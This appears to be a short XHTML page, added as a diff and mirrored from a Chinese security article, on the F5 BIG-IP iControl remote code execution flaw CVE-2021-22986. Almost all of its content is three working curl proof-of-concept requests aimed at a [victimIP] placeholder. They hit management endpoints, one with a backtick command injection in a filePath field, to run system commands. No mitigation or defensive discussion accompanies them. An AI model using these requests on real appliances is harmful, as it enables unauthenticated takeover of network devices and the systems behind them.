@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>F5 BIG-IP iControl RCE (CVE-2021-</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>F5 BIG-IP iControl RCE (CVE-2021-</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MjM5NDUxMTI2NA==&amp;mid=2247484810&amp;idx=1&amp;sn=33a7a2fd16c9d888d4be9a8849e23d5b&amp;chksm=a687e54591f06c533e33d5738ae404fdd4638960879f8dab0d3565ca35e3c70beaed41593a4e&amp;scene=126&amp;sessionid=1681663453#rd">http://mp.weixin.qq.com/s?__biz=MjM5NDUxMTI2NA==&amp;mid=2247484810&amp;idx=1&amp;sn=33a7a2fd16c9d888d4be9a8849e23d5b&amp;chksm=a687e54591f06c533e33d5738ae404fdd4638960879f8dab0d3565ca35e3c70beaed41593a4e&amp;scene=126&amp;sessionid=1681663453#rd</a></blockquote><div>F5 BIG-IP iControl RCE (CVE-2021-22986)</div><div><br/></div><div>execute arbitrary system commands</div><div>create or delete files</div><div>disable services</div><div><br/></div><div>PoC #1</div><div>curl -su admin: -H "Content-Type: application/json" http://[victimIP]/mgmt/tm/util/bash -d '{"command":"run","utilCmdArgs":"-c id"}'</div><div><br/></div><p><img class="item item-image" data-type="2" data-src="https://mmbiz.qpic.cn/mmbiz_jpg/flBFrCh5pNbrsuoXwgNTyD3Wtl1LLpSaibgT1BMYcmM9fP8heuV4L0LxelYZUCIO0gLtmzM6RmQrHEWQBJoS1cQ/640?wx_fmt=jpeg" style="height: px;" src="../Images/4db2649862ef3a94f019e196d753282a.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_jpg/flBFrCh5pNbrsuoXwgNTyD3Wtl1LLpSaibgT1BMYcmM9fP8heuV4L0LxelYZUCIO0gLtmzM6RmQrHEWQBJoS1cQ/640?wx_fmt=jpeg"/></p><div>PoC #2</div><div>curl -ks https://[victimIP]/mgmt/shared/authn/login -d '{"bigipAuthCookie":"","loginReference":{"link":"http://localhost/mgmt/tm/access/bundle-install-tasks"},"filePath":"`id`"}'</div><div><br/></div><p/><p><img class="item item-image" data-type="2" data-src="https://mmbiz.qpic.cn/mmbiz_jpg/flBFrCh5pNbrsuoXwgNTyD3Wtl1LLpSawmibOh17IdWd1uk9et9jzNFcGV8JZFjpMjtnkticTg9crrPnv2joD93g/640?wx_fmt=jpeg" style="height: px;" src="../Images/a64961f5bc2f46fbc56736d22da1cbd7.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_jpg/flBFrCh5pNbrsuoXwgNTyD3Wtl1LLpSawmibOh17IdWd1uk9et9jzNFcGV8JZFjpMjtnkticTg9crrPnv2joD93g/640?wx_fmt=jpeg"/></p>PoC #3<div><br/></div><div>curl -ksu admin:[redacted] https://[vimtimIP]/mgmt/tm/access/bundle-install-tasks -d '{"filePath":"id"}'</div><div><br/></div><p><img class="item item-image" data-type="2" data-src="https://mmbiz.qpic.cn/mmbiz_jpg/flBFrCh5pNbrsuoXwgNTyD3Wtl1LLpSaYkBT4iavKNGbibh7QiayTyOErt6xuVVQBzeCUibbaSic1rgicdODhPzyOTGQ/640?wx_fmt=jpeg" style="height: px;" src="../Images/959a3f5426a0f7d927e5ae7dc1837083.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_jpg/flBFrCh5pNbrsuoXwgNTyD3Wtl1LLpSaYkBT4iavKNGbibh7QiayTyOErt6xuVVQBzeCUibbaSic1rgicdODhPzyOTGQ/640?wx_fmt=jpeg"/></p><div><br/></div><div><br/></div><div>来源：https://twitter.com/wugeej/status/1372392693989445635</div><div><br/><br/></div>
+        
+</body>
+</html>
